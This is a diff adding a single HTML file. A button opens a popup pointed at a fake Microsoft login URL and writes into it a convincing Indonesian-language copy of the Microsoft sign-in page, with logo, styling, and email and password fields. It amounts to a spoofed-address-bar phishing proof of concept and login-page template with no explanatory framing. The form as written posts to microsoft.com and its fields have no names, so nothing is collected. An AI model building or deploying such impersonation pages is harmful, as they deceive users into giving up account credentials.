@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="tester()">click here</button>
+
+    <script>
+      function tester() {
+        let win = window.open(
+          "https://login.microsoftonline.com/common/oauth2/v2.0/authorize-fake-address-bar",
+          "_blank"
+        );
+
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk | Akun Microsoft</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ======================================= */
+        /* BASE STYLES                             */
+        /* ======================================= */
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f3f3f3;
+            background-image: linear-gradient(135deg, rgba(234, 236, 237, 0.5) 0%, rgba(220, 222, 223, 0.5) 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #1b1b1b;
+        }
+
+        /* ======================================= */
+        /* WRAPPER AND CARDS                       */
+        /* ======================================= */
+        .login-wrapper {
+            width: 100%;
+            max-width: 440px;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            padding: 32px 40px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 16px;
+        }
+        
+        /* ======================================= */
+        /* HEADER                                  */
+        /* ======================================= */
+        .card-header {
+            margin-bottom: 24px;
+        }
+
+        .card-header .logo {
+            margin-bottom: 24px;
+        }
+
+        .card-header h2 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        /* ======================================= */
+        /* FORM STYLING                            */
+        /* ======================================= */
+        .form-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #757575;
+            outline: none;
+            background-color: transparent;
+            transition: border-bottom-color 0.2s ease;
+        }
+
+        .form-control:focus {
+            border-bottom-color: #0067B8;
+        }
+
+        .form-group label {
+            position: absolute;
+            top: 10px;
+            left: 0;
+            color: #757575;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        /* Floating Label Effect */
+        .form-control:focus + label,
+        .form-control:not(:placeholder-shown) + label {
+            top: -12px;
+            font-size: 12px;
+            color: #0067B8;
+        }
+        
+        .form-options {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 24px;
+        }
+
+        .form-options a {
+            color: #0067B8;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .form-options a:hover {
+            text-decoration: underline;
+        }
+
+        /* ======================================= */
+        /* BUTTONS                                 */
+        /* ======================================= */
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+
+        .btn {
+            padding: 10px 16px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            font-weight: 600;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-secondary {
+            background-color: #e6e6e6;
+            color: #1b1b1b;
+        }
+
+        .btn-secondary:hover {
+            background-color: #dcdcdc;
+        }
+
+        .btn-primary {
+            background-color: #0067B8;
+            color: #ffffff;
+        }
+
+        .btn-primary:hover {
+            background-color: #005a9e;
+        }
+
+        /* ======================================= */
+        /* LOGIN OPTIONS CARD                      */
+        /* ======================================= */
+        .login-options-card {
+            background-color: #ffffff;
+            padding: 24px 40px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-options-card h3 {
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        /* ======================================= */
+        /* RESPONSIVE DESIGN                       */
+        /* ======================================= */
+        @media (max-width: 768px) {
+            body {
+                background-image: none;
+                background-color: #ffffff;
+            }
+            .login-wrapper {
+                padding: 0;
+            }
+            .login-card, .login-options-card {
+                box-shadow: none;
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="login-card">
+            <div class="card-header">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                        <path fill="#F25022" d="M12 11.235H0V0h12z"/>
+                        <path fill="#7FBA00" d="M24 11.235H12V0h12z"/>
+                        <path fill="#00A4EF" d="M12 24H0V12.765h12z"/>
+                        <path fill="#FFB900" d="M24 24H12V12.765h12z"/>
+                    </svg>
+                </div>
+                <h2>Masuk</h2>
+            </div>
+            
+            <form action="https://www.microsoft.com/id-id" method="post">
+                <div class="form-group">
+                    <input type="text" id="email" class="form-control" placeholder=" " required>
+                    <label for="email">Alamat email, nomor telepon, atau Skype</label>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" class="form-control" placeholder=" " required>
+                    <label for="password">Kata sandi</label>
+                </div>
+                
+                <div class="form-options">
+                    <a href="#">Belum punya akun? Buat sekarang!</a>
+                    <a href="#">Tidak dapat mengakses akun Anda?</a>
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">Masuk</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="login-options-card">
+            <h3>Opsi masuk</h3>
+        </div>
+    </div>
+</body>
+</html>
+                `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
